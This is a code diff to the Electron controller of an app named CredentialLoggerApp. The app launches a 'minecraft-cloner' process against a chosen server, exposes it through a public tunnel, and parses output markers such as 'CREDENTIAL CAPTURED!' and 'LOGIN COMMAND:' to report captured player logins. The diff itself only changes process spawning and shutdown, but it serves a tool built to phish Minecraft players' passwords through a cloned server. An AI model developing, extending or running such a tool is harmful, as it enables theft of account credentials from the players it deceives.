@@ -1,3 +1,5 @@
+// Kill process tree helper
+const treeKill = require('./tree-kill-helper');
 const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
 const path = require('path');
 const fs = require('fs');
@@ -91,15 +93,19 @@ class CredentialLoggerApp {
         });
     }
 
+
     async startCloner(serverHost, serverPort) {
         try {
             if (this.clonerProcess) {
                 this.stopCloner();
             }
 
+            // On Windows, use shell: true for better signal handling
             this.clonerProcess = spawn('node', ['minecraft-cloner.js', serverHost, serverPort], {
                 cwd: __dirname,
-                stdio: ['pipe', 'pipe', 'pipe']
+                stdio: ['pipe', 'pipe', 'pipe'],
+                detached: false,
+                shell: process.platform === 'win32'
             });
 
             let output = '';
@@ -108,49 +114,37 @@ class CredentialLoggerApp {
             this.clonerProcess.stdout.on('data', (data) => {
                 const text = data.toString();
                 output += text;
-                
-                // Send output to render
+                // ...existing code...
                 this.mainWindow?.webContents.send('cloner-output', text);
-
-                // Extract Public URL
+                // ...existing code...
                 const urlMatch = text.match(/📡 PUBLIC IP: (.+)/);
                 if (urlMatch) {
                     publicUrl = urlMatch[1].trim();
                     this.mainWindow?.webContents.send('public-url', publicUrl);
                 }
-
-                // Extract server version
                 const versionMatch = text.match(/Version: (.+)/);
                 if (versionMatch) {
                     this.mainWindow?.webContents.send('server-info-update', {
                         version: versionMatch[1].trim()
                     });
                 }
-
                 const playersMatch = text.match(/Players: (.+)/);
                 if (playersMatch) {
                     this.mainWindow?.webContents.send('server-info-update', {
                         players: playersMatch[1].trim()
                     });
                 }
-
-                // Extract server status
                 if (text.includes('✅ Server detected successfully!')) {
                     this.mainWindow?.webContents.send('server-status', 'connected');
                 }
-
                 if (text.includes('🎉 PUBLIC TUNNEL ACTIVE!')) {
                     this.mainWindow?.webContents.send('tunnel-status', 'active');
                 }
-
-                // Detect new credentials with multiple patterns
                 if (text.includes('🔥 CREDENTIAL CAPTURED!') || 
                     text.includes('LOGIN COMMAND:') || 
                     text.includes('REGISTER COMMAND:') ||
                     text.includes('📝 COMMAND')) {
-                    
                     console.log('🔄 Credentials updated - notify renderer');
-                    
                     this.mainWindow?.webContents.send('credentials-updated');
                     setTimeout(() => {
                         this.mainWindow?.webContents.send('credentials-updated');
@@ -176,12 +170,20 @@ class CredentialLoggerApp {
     }
 
     stopCloner() {
-    if (this.clonerProcess) {
-        this.clonerProcess.kill();
-        this.clonerProcess = null;
-    }
-    this.isRunning = false;
-    return { success: true, message: 'Cloner stopped' };
+        if (this.clonerProcess) {
+            if (this.clonerProcess.pid && this.clonerProcess.pid > 0) {
+                treeKill(this.clonerProcess.pid, 'SIGKILL', (err) => {
+                    if (err && err.code !== 'ESRCH') {
+                        console.log('⚠️  Error killing cloner tree:', err.message);
+                    } else {
+                        console.log('🛑 Cloner process tree killed');
+                    }
+                });
+            }
+            this.clonerProcess = null;
+        }
+        this.isRunning = false;
+        return { success: true, message: 'Cloner stopped' };
     }
 
     async getCredentials() {
